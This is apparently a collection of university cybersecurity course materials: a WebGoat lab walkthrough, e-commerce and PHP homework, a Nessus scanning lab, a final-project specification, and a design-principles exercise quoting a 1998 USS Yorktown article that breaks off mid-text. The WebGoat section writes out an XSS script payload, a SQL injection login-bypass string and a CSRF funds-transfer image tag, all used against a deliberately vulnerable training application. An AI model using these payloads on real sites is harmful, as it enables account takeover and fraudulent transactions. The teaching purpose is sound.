Now go to your browser (for WebGoat) and open Preferences in the menu. Under General, scroll down to find Network Settings and then click on Settings. Enter the settings as below and, if applicable, remove any text in No proxy for box. Enter the address (127.0.0.1) and port number (8008) from webscarab and click OK. In the browser URL location, type ""about:config"" and hit enter as shown below. Click on ""Accept Risk and Continue"". In the next window, click on ""Show All"". In the search bar, type ""network.proxy.allow_hijacking_localhost"", as shown below. You will see theÂ field set to ""false"". Click on the button (highlighted in red below) to switch it to ""true"". The field will now be set to ""true"". Now, click on Update Profile of Tom Cat (employee). A window pops up showing all the fields in ""Update Profile"" form. Append the following JavaScript to the address1 field: <script>alert(""XSS"");</script> Click Accept Changes. Click OK on the XSS alert. Now, go to webscarab and uncheck the Intercept requests box under Proxy Manual Edit. Then, log out as Tom Cat (employee). Now, letâ€™s login as another user and see if the JavaScript we have added works when we view Tomâ€™s profile. Login as Jerry Mouse (hr) where password is ""jerry"". Select Tom Cat (employee) and View Profile. We should see an alert dialog, saying ""XSS"". This confirms that our script runs when another user is logged in. Using this attack, an attacker can steal user information from the cookies of a victim. Click OK on the XSS alert and logout as Jerry Mouse (hr). Turn off intercept until needed to process the web requests without delay. Q6: Attach a screenshot of your results showing the lab was successful (with the XSS alert logged in as Jerry Mouse (hr). SQL INJECTION SQL Injection is a technique to inject attack code into the SQL queries that run on the server. One simple attack is to inject an attack string to achieve unauthorized access to a userâ€™s account. Select the following option in the WebGoat left hand menu: Injection Flaws LAB: SQL Injection Stage 1: String SQL Injection Start the intercept in webscarab: Go to Proxy Manual Edit and select Intercept requests. In WebGoat, select the admin (last user on the list). We will see how an attacker can login to a vulnerable web application without providing the password. Click Login on the web application and this request is trapped the webscarab as follows: Now tamper the password as follows: Set password as <any string>' OR '1'='1. As an example, we set our password as: PWNED' OR '1'='1. Click Accept changes and Stop intercepting You should be now logged in as the administrator. To verify your admin rights, try viewing any profile. Click Logout to logout as admin. Q7: Attach a screenshot of successful completion of task. CROSS SITE REQUEST FORGERY CSRF is an attack which forces an end user to execute unwanted actions on a web application in which he/she is currently authenticated. With a little help of social engineering (like sending a link via email/chat), an attacker may force the users of a web application to execute actions of the attacker's choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application. Select the following option in the WebGoat left hand menu: Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF) In the ""Title:"" field, enter a unique title to grab the victimsâ€™ attention such as ""Free Kittens"". Be sure the Title is unique by including your EUID so we know the submitted solution is yours. In the ""Message: "" field, you will need to load an HTML image where the image is actually empty and a ""transferFunds"" parameter is loaded with an arbitrary value as follows: <img src='attack?Screen=2078372&menu=900&transferFunds=5000'> Then click the ""Submit"" button. (Note: the Screen and menu parameters come from the page source) You should now scroll down to see your new entry in the Message List below: Clicking on your message should cause your message to load on the victim webpage pulling in your exploit code and revealing a green check box next to the WebGoat Cross Site Request Forgery (CSRF) menu option revealing successful completion of this task. (You may need to refresh the page to get the check box.) Q8: Attach a screenshot showing the lab is successful. BUFFER OVERFLOW A buffer overflow occurs when a program or process tries to store more data in aÂ buffer (temporary data storage area) than it was intended to hold. Since buffers are created to contain a finite amount of data, the extra information - which has to go somewhere - can overflow into adjacent buffers, corrupting or overwriting the valid data held in them. Although it may occur accidentally through programming error, buffer overflow is an increasingly common type of security attack onÂ data integrity. In buffer overflow attacks, the extra data may contain codes designed to trigger specific actions, in effect sending new instructions to the attacked computer that could, for example, damage the user's files, change data, or disclose confidential information. There are many variations of the buffer overflow but for this lab we will focuses on web applications. Buffer Overflow and Web Applications Attackers use buffer overflows to corrupt the execution stack of a web application. By sending carefully crafted input to a web application, an attacker can cause the web application to execute arbitrary code â€“ effectively taking over the machine. Buffer overflow flaws can be present in both the web server or application server products that serve the static and dynamic aspects of the site, or the web application itself. Buffer overflows found in widely used server products are likely to become widely known and can pose a significant risk to users of these products. When web applications use libraries, such as a graphics library to generate images, they open themselves to potential buffer overflow attacks. Buffer overflows can also be found in custom web application code, and may even be more likely given the lack of scrutiny that web applications typically go through. Buffer overflow flaws in custom web applications are less likely to be detected because there will normally be far fewer hackers trying to find and exploit such flaws in a specific application. If discovered in a custom application, the ability to exploit the flaw (other than to crash the application) is significantly reduced by the fact that the source code and detailed error messages for the application are normally not available to the hacker. Consequences â¦ Category: Availability: Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop. â¦ Access control (instruction processing): Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a programâ€™s implicit security policy. â¦ Other: When the consequence is arbitrary code execution, this can often be used to subvert any other security service. Exposure period â¦ Requirements specification: The choice could be made to use a language that is not susceptible to these issues. â¦ Design: Mitigating technologies such as safe-string libraries and container abstractions could be introduced. â¦ Implementation: Many logic errors can lead to this condition. It can be exacerbated by lack of or misuse of mitigating technologies. Select the following option in the WebGoat left hand menu: Buffer Overflows Off-by-One Overflows A web page will be displayed; the web page is simulating a room booking. What you need to do â¦ You will enter arbitrary details. First Name A Last Name A Room Number Over 6000 Aâ€™s or any characters as shown below â¦ Click ""Submit"" and then ""Accept Terms"". â¦ Right click on the page and select ""Inspect Element (Q)"" you will be able to see hidden form fields. Remove the type=""HIDDEN"" parameters for all of the guests. â¦ After deleting the parameter type=""HIDDEN"" you will be able to see details of your input data on the web page. Remember the other guestâ€™s information (i.e., First Name, Last Name, Room Number). â¦ Click on ""Restart Lesson"" and give these room details for one of the users to complete the task. (You can use any of the other member room details.) Q9: What is John Smithâ€™s room number? Attach a screenshot of the web page showing the details."
Secure Electronic Commerce,5560,Ecommerce Overview HTTP,"Homework 1 Due: 11:59 PM on Tuesday, February 1, 2022. Please answer in your own words and show any and all work. (10 points) In traditional commerce, information asymmetry existed between the seller and buyer. Describe how does electronic commerce reduces information asymmetry and provide a clear example of this. How have merchants been able to maintain a sense of balance in this power relationship now that consumers have leveled the playing field (i.e., what have merchants done or what can they do to keep customers coming back related specifically to information asymmetry)? Provide at least two ways merchants do this. (10 points) We discussed in class that third generation e-commerce technologies added the capability for customers to find information about companies, products, and services through the use of search engines. The search engines themselves make use of web crawlers to find and index available web pages, which increases the likelihood of potential customers finding out about web sites. State one valid reason why an owner of a web site might not want to have a web crawler access his/her web site. E-commerce sites use markup languages such as HTML and XML as part of their infrastructure for message and information distribution. These tags can simplify the job of search engine by providing context to the siteâ€™s content, such as clarifying which of several meanings of a particular word is the relevant one. What is one major downside of search engines relying on this page content? (10 points) Answer the following questions about classful and classless (i.e., CIDR) IP addresses. Using classful IP addressing, identify the class (i.e., A, B, C, D, or E), the prefix, and suffix of the IP address 172.16.52.63. In general, how many host addresses are available for use in a class C network using classful IP addressing? Consider the IP address 135.46.60.0/22 in a classless (i.e., CIDR) implementation. How many possible host addresses are available for use in this network? (10 points) To save some money, an organization is considering developing a solution that offers security only at the physical layer of the TCP/IP model and not other layers since all the traffic must go through this layer. Is this a good idea? Why or why not? (10 points) What is DNS and what role does it play in the Internet and E-Commerce? On October 21, 2016, Dyn, Inc., an Internet infrastructure company that provides DNS and other services, sustained a distributed denial of service (DDoS) attack that took down a significant portion of the Internet on the U.S. East Coast. What would be the effect if all DNS servers were taken offline by a DDoS attack? Be specific. (10 points) HTTP is considered to be a stateless protocol. What does it mean that HTTP is stateless? Describe how you can make HTTP to be stateful? Give two benefits of making HTTP stateful. (10 points) The Internet has mainly evolved using the 5-layer TCP/IP model architecture based on the 7-layer OSI model. Why is this layered approach important (i.e., identify and describe at least one advantage of the layered architecture approach)? Identify and describe at least one disadvantage of the layered architecture approach. (10 points) As a key Internet technology, describe the importance of packet switching to the Internet, which has in turn benefited the growth of e-commerce. As a hint, you may want to compare packet switching to circuit switching and describe why packet switching is more beneficial to support the growth of e-commerce. (10 points) HTTP supports cache coherence. The If-Modified-Since header is used to check if the resource has been changed, and thus if the cache page is still valid. Since client requests can be made for pages containing multimedia, such as images, video, sound, and so forth, in addition to HTML, describe the effectiveness of using the If-Modified-Since header for HTML versus JPEG images (i.e., which one performs better with this technique and why?). (10 points) What is meant by a static web page? Briefly describe at least two disadvantages of building a web site using static pages. Are there any advantages? If so, list at least two of them"
Secure Electronic Commerce,5560,HTML PHP,"Homework 2 Due: 11:59 PM on Friday, February 18, 2022. In this homework assignment, you will use HTML and PHP in writing a PHP script that processes an HTML form, including some server-side form validation using PHP. Please make sure to follow these instructions exactly as specified and not explicitly add other elements or features. â¦ Creating an HTML Form Your main HTML page, called <EUID>.html will contain a form that submits to <EUID>.php, where <EUID> should be replaced with your actual EUID. You will write an HTML page with your own data, following the general structure as follows: The HTML page must contain the following elements: â¦ Title of the page â¦ A large heading centered at the top of the page, followed by a paragraph with at least three lines of text, but no more than five lines of text. â¦ A horizontal rule separating the top half of the page from the bottom half. â¦ A smaller heading centered just underneath the horizontal rule (i.e., smaller than the heading at the top of the page). â¦ Four different inputs in order with HTML text indicating what type of input is requested aligned to the left side of the page: (a) a one-line text box; (b) a drop-down list with at least three options, and a default value; (c) a one-line text box for some numeric input (this input will be validated later); and (d) either two radio buttons or two checkboxes with no default. You have some flexibility here in the actual data that you collect. â¦ An image aligned to the center of the right side of the page, across the page from the four inputs (note positioning in the diagram). â¦ A reset button to clear the form data and a submit button to send the form data to the PHP page. You will need to give name and possibly value attributes to the form controls so that they will be sent to the server as query parameters. â¦ Displaying Input Data Your PHP page, called <EUID>.php will handle the submitted form data, where <EUID> should be replaced with your actual EUID. Your <EUID>.html page should POST to <EUID>.php (i.e., send form data to <EUID>.php). The <EUID>.php page will receive the parameters from <EUID>.html and will out put an HTML confirmation page that indicates the userâ€™s information has been recorded plus outputs the actual data that was submitted. â¦ Save the Form Data Now, modify your <EUID>.php page to save the submitted data to the file <EUID>.txt, where <EUID> should be replaced with your actual EUID. If the <EUID>.txt file already exists, this data should be appended to the file. Additionally, modify your PHP page to output the historical data to your page, showing the complete contents of the file to the user on the <EUID>.php page. You should also place the file contents in an HTML <pre> tag to preserve the whitespace. â¦ Basic Data Validation Update your <EUID>.php page to verify that the user did not leave any fields blank when submitting the form. You can check whether a particular parameter has been passed using the PHP function isset(). However, isset($_POST[""name""]) will only check if the $_POST associative array has name as one of its keys. It does not check to see if the value of $_POST[""name""] is a non-empty value. If the user has not filled in every field, you will show an error message on the <EUID>.php page like the one below instead of displaying their submitted data: The ""Error"" should be a large heading and the text should be in paragraph form. The ""Try again?â€ should link back to your <EUID>.html page so that the user can try again to enter the data. In error cases, no data should be written to the <EUID>.txt file. REQUIREMENTS: â¦ You are to write the HTML and PHP code solely on your own, without the aid of web page development software (e.g., WordPress, Drupal, etc.) on our Linux CSE servers (e.g., cse01, cse02, â€¦, cse06) or Internet solutions. Points may be deducted for submissions found to contain HTML or PHP code automatically generated or from other sources. Additionally, no CSS may be included with studentâ€™s submission. â¦ You will have to install phpMyAdmin on the Linux CSE server following the first three steps in the ""Installing phpMyAdmin.pdf"" file on Canvas for this activity. â¦ Your HTML and PHP code should be well documented in terms of comments. For example, good comments in general consist of a header (with your name, course section, date, and brief description), comments for each variable, and commented blocks of code. â¦ Your scripts will be graded based largely on whether it works correctly on the CSE machines, so you should make sure that your scripts do not have any runtime errors and runs on a CSE machine. â¦ If you have any questions about what is expected, please contact your instructor or TA assigned to this course to ensure you understand these directions. â¦ This is an individual programming assignment that must be the sole work of the individual student. Any instance of academic dishonesty will result in a grade of â€œFâ€ for the course, along with a report filed into the Academic Integrity Database. SUBMISSION: â¦ You will electronically submit your files in a ZIP folder to the Homework 2 dropbox in Canvas by the due date and time. Please also include the URL and any instructions in a README file to Canvas."
Secure Electronic Commerce,5560,Network Vulnerabilities,"Lab 3: Nessus Lab This lab uses the Kali 2021 virtual machine (VM) as OVA file KALI-20.ova on Canvas. The credentials are as follows: Username: osboxes Password: osboxes.org INSTALLING, CONFIGURING AND USING NESSUS In this recipe, we install, configure, and start Nessus. Nessus depends on vulnerability checks in the form of feeds to locate vulnerabilities on our chosen target. Nessus comes into two flavors of feeds: Home and Professional. â¦ Home Feed: The Home Feed is for noncommercial/personal usage. Using Nessus in a professional environment for any reason requires the use of the Professional Feed. â¦ Professional Feed: The Professional Feed is for commercial usage. It includes support and additional features such as unlimited concurrent connections and so on. If you are a consultant and are performing tests for a client, the Professional Feed is the one for you. For our recipe, we will assume you are utilizing the Home Feed. Notes: 1. Do this Lab in Kali-20.ova VM (username : osboxes ; password : osboxes.org) and metasploitable 2 (username : msfadmin ; password : msfadmin). Download Metasploitable from â€œhttps://information.rapid7.com/download-metasploitable-2017.htmlâ€ 2. The network settings of Kali VM should be Attached to: Bridge Adapter. Example is shown in below screen shot. And change metasploitable2 and ubuntu-desktop network setting to host only. 3. Compiling plugins during initialization phase of Nessus might take lot of time depending on the size of RAM. 4. Allocate 8GB to Kali-20 if you have enough RAM space available. Letâ€™s begin the installation, configuring, and starting of Nessus by opening a terminal window: Note: If you are unable to download the Nessus please change Network settings to â€œNATâ€ and after installing all turn it Back to â€œBridger Adapterâ€ to perform the lab. â¦ Open the firefox esr web browser and navigate to the following URL: http://www. tenable.com/products/nessus/select-your-operating-system. â¦ Select Nessus-8.9.0-debian6_amd64.deb or Latest Version of it. â¦ Download the file to your local root directory. â¦ Open a terminal window. â¦ Execute the following command to install Nessus: sudo dpkg â€“i ""Nessus-8.9.0-debian6_amd64.deb"" //Nessus will be installed under the /opt/nessus directory â¦ Once the installation completes, you can run Nessus by typing the following command: sudo /bin/systemctl start nessusd.service //this starts the Nessus and runs in the background NOTE: To register your copy of Nessus, you must have a valid license (product key), which can be obtained from http://www.tenable.com/products/nessus/nessus-essentials. After you register the activation key will be sent to your mail address specified. â¦ Enable your Nessus install by executing the following command. You need to register and obtain activation Code prior to this instruction. Registration details are in above instructions. sudo /opt/nessus/sbin/nessuscli fetch --register XXXX-XXXX-XXXX-XXXX- XXXX In this step, we will also grab the latest plugins from http://plugins.nessus.org. â¦ Now enter the following command in the terminal sudo /opt/nessus/sbin/nessuscli adduser //adds the user to access nessus â¦ At the login prompt, enter the login name of the user. â¦ Enter the password of your choice twice. â¦ Answer as Y (Yes) to make this user an administrator. â¦ Once complete, you can run Nessus by typing the following command (it won't work without a user account) sudo /bin/systemctl start nessusd.service 13. Now got to URL â€œhttps://127.0.0.1:8834/html5.html#/â€ which will bring you to below page. Add Exception and confirm the security Exception. 14. Select â€œNessus Essentialsâ€. 15. Create account following the steps. Refresh the page to see update bar. This may take some time (~45min). Once initialization is finished, restart Kali VM with network settings changed to bridged adapter if you are using NAT. Restart nessusd by using â€œsudo /bin/systemctl start nessusd.serviceâ€. Open nessus URL â€œhttps://127.0.0.1:8834/html5.html#/â€ in firefox esr again and login. Q1. Provide Screen Shot of your above Logged in Nessus Page. Nessus â€“ finding Local Vulnerabilities: Now that we have Nessus installed and configured, we will be able to begin testing of our first set of vulnerabilities. Nessus allows us to attack a wide range of vulnerabilities depending on our feed, and we will confine our list of assessing the vulnerabilities of our target to those specific to the type of information we seek to gain from the assessment. In this recipe, we will begin by finding local vulnerabilities. These are vulnerabilities specific to the operating system we are using. Disable Firewalls if you get empty reports after the scan. Let's begin the process of finding vulnerabilities with Nessus by opening the web browser: 1. Log in to Nessus at https://127.0.0.1:8834. 2. Click on â€œScansâ€ on the Top Menu Bar. 3. Click on New Scan. You Will see the below window, select Advanced Scan. 4. Click on Advanced Scan, perform the following tasks: â¦ Under General Type, â¦ Enter a name for your scan. We chose Local Vulnerability Assessment. â¦ Let the Folder field be My Scans. â¦ Choose your targets considering the following points: â¦ Targets must be entered one per line. â¦ You can also enter ranges of targets on each line. â¦ You may also upload a target's file (if you have one) or select Add Target IP Address. â¦ To enter the host IP address, go to virtual box and start metasploitable 2 (network settings as bridged adapter)giving username and password as msfadmin. â¦ Then type ifconfig to obtain the ipaddress 5. On the Plugins tab, select Disable All and Enable the following specific vulnerabilities: â¦ Ubuntu Local Security Checks â¦ Default Unix Accounts â¦ DNS â¦ FTP â¦ SMTP Problems â¦ SNMP â¦ Settings â¦ Web Servers â¦ Denial of Service 6. Click on save to save your new scan. 7. Click on Launch. 10. You will get a confirmation and your test will complete (depending on how many targets are selected and the number of tests performed). 11. Once completed, you can export a report. 12. Double-click on the report to analyze the following points (on the Results tab): â¦ Each target in which vulnerability is found will be listed â¦ Double-click on the IP address to see the ports and issues on each port â¦ Click on the number under the column to get the list of specific issues/vulnerabilities found â¦ The vulnerabilities will be listed in detail 13. Click on export Report. Q2. Attach the Downloaded report while submitting and write down summary of scanned analysis in brief. Nessus â€“ Finding network vulnerabilities: Nessus allows us to attack a wide range of vulnerabilities depending on our feed, and we will confine our list of assessing the vulnerabilities of our target to those specific to the type of information we seek to gain from the assessment. In this recipe, we will configure Nessus to find network vulnerabilities on our targets. These are vulnerabilities specific to the machines or protocols on our network. To complete this recipe, you will need a virtual machine(s) to test against: Start all VMâ€™s with network settings as bridged adapter. â¦ Metasploitable 2.0 (VM creds: msfadmin/msfadmin) â¦ UbuntuDesktop VM (VM creds: sec-lab/untccdc) Use the cscelab.ova file. 1. Log in to Nessus at https://127.0.0.1:8834. 2. Go to Scans. 3. Click on â€œNew Scanâ€ then Select â€œAdvanced Scanâ€. â¦ Under General Type, â¦ Enter a name for your scan. We chose, Internal Network Scan. â¦ Let the Folder field be My Scans. â¦ Choose your targets considering the following points: â¦ Targets must be entered one per line â¦ You can also enter ranges of targets on each line â¦ You may also upload a target's file (if you have one) or select Add Target IP Address. â¦ To enter the host ip address go to virtual box and start metasploitable 2 giving username and password as msfadmin and Start Ubuntu desktop VM with user id as sec-lab and password as untccdc. You can use your own windows IP address for use. â¦ Then type ifconfig to obtain the ipaddress in Ubuntu and metasploitable. 9. On the Plugins tab, click on Disable All and select the following specific vulnerabilities: â¦ CISCO â¦ DNS â¦ Default Unix Accounts â¦ FTP â¦ Firewalls â¦ Gain a shell remotely â¦ General â¦ Netware â¦ Peer-To-Peer File Sharing â¦ Policy Compliance â¦ SCADA â¦ SMTP Problems â¦ SNMP â¦ Service Detection â¦ Settings 10. Click on save to save your new scan 11. On the main menu, click on the Scan. Then Click on Launch button to start scanning. 12. Once completed, you will receive a report inside of the Results tab. 13. Double-click on the report to analyze the following points: â¦ Each target in which a vulnerability is found will be listed â¦ Double-click on the IP address to see the ports and issues on each port â¦ Click on the number under the column to get the list of specific issues vulnerabilities found â¦ The vulnerabilities will be listed in detail 14. Click on export Report Q3. Attach the Downloaded report while submitting and write down summary of scanned analysis in brief. Nessus â€“ Finding Linux-specific vulnerabilities: To complete this recipe, you will need a virtual machine(s) to test against: â¦ Ubuntu Desktop â¦ Metasploitable â¦ Start a new scan advanced settings. â¦ Give Target ipâ€™s of Ubuntu Desktop and Metasploitable. 3. On the Plugins tab, click on Disable All and enter the following specific vulnerabilities. This list is going to be rather long as we are scanning for services that may be running on our Linux target: â¦ Backdoors â¦ Brute Force Attacks â¦ CentOS Local Security Checks â¦ DNS â¦ Debian Local Security Checks â¦ Default Unix Accounts â¦ Denial of Service â¦ FTP â¦ Fedora Local Security Checks â¦ Firewalls â¦ FreeBSD Local Security Checks â¦ Gain a shell remotely â¦ General â¦ Gentoo Local Security Checks â¦ HP-UX Local Security Checks â¦ Mandriva Local Security Checks â¦ Misc â¦ Red Hat Local Security Checks â¦ SMTP Problems â¦ SNMP â¦ Scientific Linux Local Security Checks â¦ Slackware Local Security Checks â¦ Solaris Local Security Checks â¦ SuSE Local Security Checks â¦ Ubuntu Local Security Checks â¦ Web Servers 4. Click on â€œSaveâ€ to save your new scan. 5. Run and export the scan results. Q4. Attach the Downloaded report while submitting and write down summary of scanned analysis in brief."
Secure Electronic Commerce,5560,Secure Ecommerce Software,"CSCE 5560 Final Project Due: 11:59 PM on Monday, May 2, 2022 version 0.4 1 Each project group will consist of approximately four students, but may container fewer than four. Each team will implement some type of secure e-commerce web application. You may choose from, but are not limited to, the following with approval: â€¢ Web Shop â€“ with shopping cart and checkout and item search â€¢ Auction Site â€“ search function, monitoring/filtering â€¢ Simple Bank/Financial Service â€“ move money between accounts, take loans (sign agreements), buy funds (sign agreements), payment/withdrawal history, search function â€¢ Booking Service â€“ search booking slots/prices Each e-commerce web site will be implemented using the specific vSphere Client allocated for each group. Membership in each group is defined under the Final Project Group listings on Canvas. You will have to set up your Virtual Machine (VM) with whatever software or technology you wish to implement on your site, but all software must be freely available and supported on these VMs. A lab assignment on installing WordPress and its various components will be assigned, though you may choose to implement your site directly using HTML, CSS, PHP, etc. as you wish. You are encouraged to come up with your own original ideas, but at a minimum, the following components must be included: â€¢ A database server â€“ persistent storage for customers, orders, products, etc. â€¢ Shopping cart functionality along with support for reliable and secure transactions, including a payment system (such as PayPal Sandbox) â€¢ User registration with authentication (e.g., for login) and verification â€¢ Administration web-interface (may be simple, but functional), such as an employee portal with authentication. Along with these components, you should address areas of security in the context of the material we are covering in this course. With regards to security, at a minimum you should protect your web site against various types of attacks, mediate all user input, and apply security techniques (such as encryption) to protect sensitive data in your database. It should be noted that points will be assessed on the project resulting from the â€œhackathonâ€ on the last day of class. Since the hackathon may be destructive (to some extent) and result in your web site going down, you will need to implement a disaster recovery plan that includes being able to â€œback up and restoreâ€ your site, including the database, to its original condition should it be compromised in a short amount of time (approximately 2 â€“ 3 minutes). Failure to be able to restore your site to its original condition may result in a loss of points. It is recommended that all members of a project group be assigned an area of responsibility. Suggested areas of responsibility include front-end design (i.e., user interface CSCE 5560 Final Project Due: 11:59 PM on Monday, May 2, 2022 version 0.4 2 of the web application), payment systems/shopping carts, and database. All students will be responsible for security. There should also be a project manager responsible for coordinating activities and making sure everything gets done. The project group will have to work together on all areas to succeed and all members should be involved to some extent in all aspects of the web application. Points will be awarded for site aesthetics as well. Since it is important to simulate the conditions in a real-world project as much as possible, the following conditions must also be followed: â€¢ Each group should have a project manager who will be responsible for overseeing the activities. The project manager will participate in other areas of responsibility as available. â€¢ Each group will submit a project proposal that gives details about the project, the proposed methodology, and expected results. â€¢ Each group will develop a small project plan, including a projection of development (e.g., perhaps using a Gantt Chart with milestones) and scope of work. The project plan should provide additional detail such as the current status, team assignments, potential issues (especially security), and a brief market analysis (what other actors are competing in the market) and a convincing argument as to what makes you better. â€¢ Each group will submit a security report on how their site has been ""hardened"" (i.e., how security was implemented) specific to their site, which means, for example, how SQL injection attacks were prevented (with specific details perhaps on the PHP page as well as database itself, for example). This should include any security implications for site design, such as maintaining state information, etc. Some items you may want to consider when designing your e-commerce web site are: â€¢ Design a system that is secure and flexible. The design should consider the requirements, flows/paths, and possible security threats and solutions. Be sure to identify and note any decisions made to improve the security of your site. â€¢ Identify different entities in the system (e.g., employee, customer, etc.) and design interfaces for each of them. â€¢ Implement forms, database access, transactions, web services, encryption, authorization, etc. â€¢ Should customers visiting your e-commerce site be able to search for items on sale, based on price, item of interest, etc.? Project Presentation Each project group will be required to present their project during the time allocated in class near the end of the semester, including a live demonstration of the project, where all team members MUST be present. The demo should be no more than 6 minutes, but cover CSCE 5560 Final Project Due: 11:59 PM on Monday, May 2, 2022 version 0.4 3 enough to show 2 customer transactions plus administration (e.g., employee portal) of the site. The presentations must include team member roles, data schema, architecture/design/user flow, security issues and mitigations/resolutions, and any other relevant information, especially as they pertain to concepts and issues discussed in class. For example, what potential security issues were raised and how were they addressed? Try to make a presentation that sells your project as a reasonable business idea. Each group has approximately 10 â€“ 12 minutes worth of presentation time, including the live demonstration. Teams will be penalized for going under 10 minutes and stopped after 12 minutes with penalty for items not addressed in their presentation and live demonstration. This presentation should contain enough information about the web site regarding the major areas of development (i.e., functionality and security) discussed during the course of the semester, including issues and resolutions. Any special features should also be documented. Timeline/Dates Project Proposal A project proposal will be due on Monday, March 28th. Project Plan A project plan will be due on Monday, April 4th. Security Report A security report will be due the week before the presentations are being made. Presentation Presentations will be done during regularly scheduled class time on Tuesday, April 26th, Thursday, April 28th, and Tuesday, May 3rd. Teams will be chosen at random in advance to present on a particular day. Hackathon Teams will meet on the last day of the regularly scheduled class day (Thursday, May 5th) to participate in a ""hackathon"" where each group will have the opportunity to try to manually ""hack"" into any other teamâ€™s site. Note that you must be present to receive points for this effort. Note that only one submission will be required for each group for these assignments. A group assessment evaluation will also be required for each team member, which can result in grading marks being reduced based on the evaluation. Submission Your web site must be able to run on the vSphere Clients, with access given to the TA. You should submit all relevant files in a ZIP file to Canvas, including a README file that explains the information required how to install and build the site, including how it works. You should also include various screen shots of your site working. Note that the dates on your electronic submission will be used to verify that you met the due date above. All projects up to 24 hours late will receive a 30% grade penalty. Later submissions will receive zero credit, so hand in your best effort on the due date. This is needed, as the TA will be working with each team to set up the environment for the hackathon on Thursday, May 5th. CSCE 5560 Final Project Due: 11:59 PM on Monday, May 2, 2022 version 0.4 4 -------------------------------------------------------------------------------------------- Any questions or exceptions to these specifications should be clarified with your instructor and/or the TA. Note that this document may be updated as needed to address unforeseen issues, especially since this is being done online this semester, but all changes will be communicated with the project groups"
Foundations of Cybersecurity,3550,NT Operating Sytens,"CSSE 340: Foundations of Cybersecurity Homework 6 Winter 2020-2021 Due: December 22, 2020 SCORE: / 25 Complete this in your own word-processed document. Include the following data at the top: the class ID (CSSE 340), the homework number, your name, and the due date. In class, we discussed 9 design principles as covered in chapter 3 of the textbook. There are many sets of design principles, but the different sets all have common themes. For this homework exercise, you will use this list of design principles that are in the textbook and also available on the course web site (Design Principles Handout). Read the story about the USS Yorktown attached. For each of the nine principles: 1. State the name of the principle 2. State whether or not the designers of the system described followed the principle AND: a. If the principle was followed, explain how the principle was followed in the systemâ€™s design. Consider quoting the article. b. If the principle was not followed, explain what the designers or development team could have done instead to follow to the principle. Consider quoting the article. web.archive.org July 13, 1998; Vol. 17 No. 17 Software glitches leave Navy Smart Ship dead in the water By Gregory Slabodkin The Navyâ€™s Smart Ship technology may not be as smart as the service contends. Although PCs have reduced workloads for sailors aboard the Aegis missile cruiser USS Yorktown, software glitches resulted in system failures and crippled ship operations, according to Navy officials. Navy brass have called the Yorktown Smart Ship pilot a success in reducing manpower, maintenance and costs. The Navy began running shipboard applications under Microsoft Windows NT so that fewer sailors would be needed to control key ship functions. But the Navy last fall learned a difficult lesson about automation: The very information technology on which the ships depend also makes them vulnerable. The Yorktown last September suffered a systems failure when bad data was fed into its computers during maneuvers off the coast of Cape Charles, Va. Software glitches leave Navy Smart Ship dead in the water 1 1/21/2016 11:29 AM The ship had to be towed into the Naval base at Norfolk, Va., because a database overflow caused its propulsion system to fail, according to Anthony DiGiorgio, a civilian engineer with the Atlantic Fleet Technical Support Center in Norfolk. â€œWe are putting equipment in the engine room that we cannot maintain and, when it fails, results in a critical failure,â€ DiGiorgio said. It took two days of pierside maintenance to fix the problem. The Yorktown has been towed into port after other systems failures, he said. Atlantic Fleet officials acknowledged that the Yorktown last September experienced what they termed â€œan engineering local area network casualty,â€ but denied that the shipâ€™s systems failure lasted as long as DiGiorgio said. The Yorktown was dead in the water for about two hours and 45 minutes, fleet officials said, and did not have to be towed in. â€œThis is the only time this casualty has occurred and the only propulsion casualty involved with the control system since May 2, 1997, when software configuration was frozen,â€ Vice Adm. Henry Giffin, commander of the Atlantic Fleetâ€™s Naval Surface Force, reported in an Oct. 24, 1997, memorandum. Giffin wrote the memo to describe â€œwhat really happened in hope of clearing the scuttlebuttâ€ surrounding the incident, he noted. The Yorktown lost control of its propulsion system because its computers were unable to divide by the number zero, the memo said. The Yorktownâ€™s Standard Monitoring Control System administrator entered zero into the data field for the Remote Data Base Manager program. That caused the database to overflow and Software glitches leave Navy Smart Ship dead in the water 2 1/21/2016 11:29 AM crash all LAN consoles and miniature remote terminal units, the memo said. The program administrators are trained to bypass a bad data field and change the value if such a problem occurs again, Atlantic Fleet officials said. But â€œthe Yorktownâ€™s failure in September 1997 was not as simple as reported,â€ DiGiorgio said. â€œIf you understand computers, you know that a computer normally is immune to the character of the data it processes,â€ he wrote in the June U.S. Naval Instituteâ€™s Proceedings Magazine. â€œYour $2.95 calculator, for example, gives you a zero when you try to divide a number by zero, and does not stop executing the next set of instructions. It seems that the computers on the Yorktown were not designed to tolerate such a simple failure.â€ The Navy reduced the Yorktown crew by 10 percent and saved more than $2.8 million a year using the computers. The ship uses dual 200-MHz Pentium Pros from Intergraph Corp. of Huntsville, Ala. The PCs and server run NT 4.0 over a high-speed, fiber-optic LAN. Despite the USS Yorktownâ€™s setbacks, the Navy plans to use Smart Ship technology on other classes of ships. The Naval Sea Systems Command in May awarded Litton Integrated Systems Corp. of Woodland Hills, Calif., a $138.6 million contract to build Engineering Control System Equipment and Integrated Bridge Systems for CG-47 Class Aegis cruisers. The Navy also might install the equipment on DDG-51 class destroyers. Software glitches leave Navy Smart Ship dead in the water 3 1/21/2016 11:29 AM Electronic Design Inc. of Metairie, La., filed a protest of the award in late May with the General Accounting Office. The Navy has issued a stop-work order that will last until GAO rules on the protest. Smart Ship technology is also on the amphibious ship USS Rushmore, Navy officials said. â€”Gregory Slabodkin Blame it on the OS But according to DiGiorgio, who in an interview said he has serviced automated control systems on Navy ships for the past 26 years, the NT operating system is the source of the Yorktownâ€™s computer problems. NT applications aboard the Yorktown provide damage control, run the shipâ€™s control center on the bridge, monitor the engines and navigate the ship when under way. â€œUsing Windows NT, which is known to have some failure modes, on a warship is similar to hoping that luck will be in our favor,â€ DiGiorgio said. Pacific and Atlantic fleets in March 1997 selected NT 4.0 as the standard OS for both networks and PCs as part of the Navyâ€™s Information Technology for the 21st Century initiative. Current guidance approved by the Navyâ€™s chief information officer calls for all new applications to run under NT. Ron Redman, deputy technical director of the Fleet Introduction Division of the Aegis Program Executive Office, said there have been numerous software failures associated with NT aboard the Yorktown. Software glitches leave Navy Smart Ship dead in the water 4 1/21/2016 11:29 AM â€œRefining that is an ongoing process,â€ Redman said. â€œUnix is a better system for control of equipment and machinery, whereas NT is a better system for the transfer of information and data. NT has never been fully refined and there are times when we have had 